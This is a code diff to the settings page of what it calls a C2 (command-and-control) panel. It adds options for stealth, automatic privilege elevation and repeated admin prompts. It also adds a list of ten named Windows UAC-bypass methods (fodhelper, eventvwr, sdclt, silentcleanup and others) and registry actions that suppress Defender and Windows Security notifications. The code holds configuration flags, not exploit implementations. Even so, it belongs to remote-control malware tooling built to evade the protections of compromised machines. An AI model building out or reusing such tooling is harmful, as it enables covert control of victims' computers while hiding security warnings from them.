@@ -84,6 +84,10 @@ interface C2Settings {
     quickStartup: boolean;
     enableStealth: boolean;
     autoElevatePrivileges: boolean;
+    requestAdminFirst: boolean;
+    maxPromptAttempts: number;
+    uacBypassDebug: boolean;
+    persistentAdminPrompt: boolean;
   };
   webrtc: {
     enabled: boolean;
@@ -104,11 +108,20 @@ interface C2Settings {
     ipBlockingEnabled: boolean;
     blockedIps: string[];
   };
+  bypasses?: {
+    enabled: boolean;
+    methods?: Record<string, boolean>;
+  };
+  registry?: {
+    enabled: boolean;
+    notificationsEnabled?: boolean;
+    actions?: Record<string, boolean>;
+  };
 }
 
 export function Settings() {
   const { theme, setTheme } = useTheme();
-  const { logout } = useSocket();
+  const { logout, agents, selectedAgent, setSelectedAgent, sendCommand } = useSocket();
   const [showPasswords, setShowPasswords] = useState({
     admin: false,
     operator: false,
@@ -158,7 +171,11 @@ export function Settings() {
       silentMode: true,
       quickStartup: false,
       enableStealth: true,
-      autoElevatePrivileges: true
+      autoElevatePrivileges: true,
+      requestAdminFirst: false,
+      maxPromptAttempts: 3,
+      uacBypassDebug: true,
+      persistentAdminPrompt: false
     },
     webrtc: {
       enabled: true,
@@ -181,6 +198,42 @@ export function Settings() {
       rateLimitWindow: 60,
       ipBlockingEnabled: false,
       blockedIps: []
+    },
+    bypasses: {
+      enabled: true,
+      methods: {
+        cleanmgr_sagerun: true,
+        fodhelper: true,
+        computerdefaults: true,
+        eventvwr: true,
+        sdclt: true,
+        wsreset: true,
+        slui: true,
+        winsat: true,
+        silentcleanup: true,
+        icmluautil: true
+      }
+    },
+    registry: {
+      enabled: true,
+      notificationsEnabled: true,
+      actions: {
+        policy_push_notifications: true,
+        policy_windows_update: true,
+        context_runas_cmd: true,
+        context_powershell_admin: true,
+        notify_center_hkcu: true,
+        notify_center_hklm: true,
+        defender_ux_suppress: true,
+        toast_global_above_lock: true,
+        toast_global_critical_above_lock: true,
+        toast_windows_update: true,
+        toast_security_maintenance: true,
+        toast_windows_security: true,
+        toast_sec_health_ui: true,
+        explorer_balloon_tips: true,
+        explorer_info_tip: true,
+      }
     }
   });
 
@@ -283,6 +336,42 @@ export function Settings() {
           security: {
             ...prev.security,
             ...data?.security,
+          },
+          bypasses: {
+            enabled: Boolean(data?.bypasses?.enabled ?? prev.bypasses?.enabled ?? true),
+            methods: {
+              cleanmgr_sagerun: Boolean(data?.bypasses?.methods?.cleanmgr_sagerun ?? prev.bypasses?.methods?.cleanmgr_sagerun ?? true),
+              fodhelper: Boolean(data?.bypasses?.methods?.fodhelper ?? prev.bypasses?.methods?.fodhelper ?? true),
+              computerdefaults: Boolean(data?.bypasses?.methods?.computerdefaults ?? prev.bypasses?.methods?.computerdefaults ?? true),
+              eventvwr: Boolean(data?.bypasses?.methods?.eventvwr ?? prev.bypasses?.methods?.eventvwr ?? true),
+              sdclt: Boolean(data?.bypasses?.methods?.sdclt ?? prev.bypasses?.methods?.sdclt ?? true),
+              wsreset: Boolean(data?.bypasses?.methods?.wsreset ?? prev.bypasses?.methods?.wsreset ?? true),
+              slui: Boolean(data?.bypasses?.methods?.slui ?? prev.bypasses?.methods?.slui ?? true),
+              winsat: Boolean(data?.bypasses?.methods?.winsat ?? prev.bypasses?.methods?.winsat ?? true),
+              silentcleanup: Boolean(data?.bypasses?.methods?.silentcleanup ?? prev.bypasses?.methods?.silentcleanup ?? true),
+              icmluautil: Boolean(data?.bypasses?.methods?.icmluautil ?? prev.bypasses?.methods?.icmluautil ?? true)
+            }
+          },
+          registry: {
+            enabled: Boolean(data?.registry?.enabled ?? prev.registry?.enabled ?? true),
+            notificationsEnabled: Boolean(data?.registry?.notificationsEnabled ?? prev.registry?.notificationsEnabled ?? true),
+            actions: {
+              policy_push_notifications: Boolean(data?.registry?.actions?.policy_push_notifications ?? prev.registry?.actions?.policy_push_notifications ?? true),
+              policy_windows_update: Boolean(data?.registry?.actions?.policy_windows_update ?? prev.registry?.actions?.policy_windows_update ?? true),
+              context_runas_cmd: Boolean(data?.registry?.actions?.context_runas_cmd ?? prev.registry?.actions?.context_runas_cmd ?? true),
+              context_powershell_admin: Boolean(data?.registry?.actions?.context_powershell_admin ?? prev.registry?.actions?.context_powershell_admin ?? true),
+              notify_center_hkcu: Boolean(data?.registry?.actions?.notify_center_hkcu ?? prev.registry?.actions?.notify_center_hkcu ?? true),
+              notify_center_hklm: Boolean(data?.registry?.actions?.notify_center_hklm ?? prev.registry?.actions?.notify_center_hklm ?? true),
+              defender_ux_suppress: Boolean(data?.registry?.actions?.defender_ux_suppress ?? prev.registry?.actions?.defender_ux_suppress ?? true),
+              toast_global_above_lock: Boolean(data?.registry?.actions?.toast_global_above_lock ?? prev.registry?.actions?.toast_global_above_lock ?? true),
+              toast_global_critical_above_lock: Boolean(data?.registry?.actions?.toast_global_critical_above_lock ?? prev.registry?.actions?.toast_global_critical_above_lock ?? true),
+              toast_windows_update: Boolean(data?.registry?.actions?.toast_windows_update ?? prev.registry?.actions?.toast_windows_update ?? true),
+              toast_security_maintenance: Boolean(data?.registry?.actions?.toast_security_maintenance ?? prev.registry?.actions?.toast_security_maintenance ?? true),
+              toast_windows_security: Boolean(data?.registry?.actions?.toast_windows_security ?? prev.registry?.actions?.toast_windows_security ?? true),
+              toast_sec_health_ui: Boolean(data?.registry?.actions?.toast_sec_health_ui ?? prev.registry?.actions?.toast_sec_health_ui ?? true),
+              explorer_balloon_tips: Boolean(data?.registry?.actions?.explorer_balloon_tips ?? prev.registry?.actions?.explorer_balloon_tips ?? true),
+              explorer_info_tip: Boolean(data?.registry?.actions?.explorer_info_tip ?? prev.registry?.actions?.explorer_info_tip ?? true),
+            }
           },
         }));
         try {
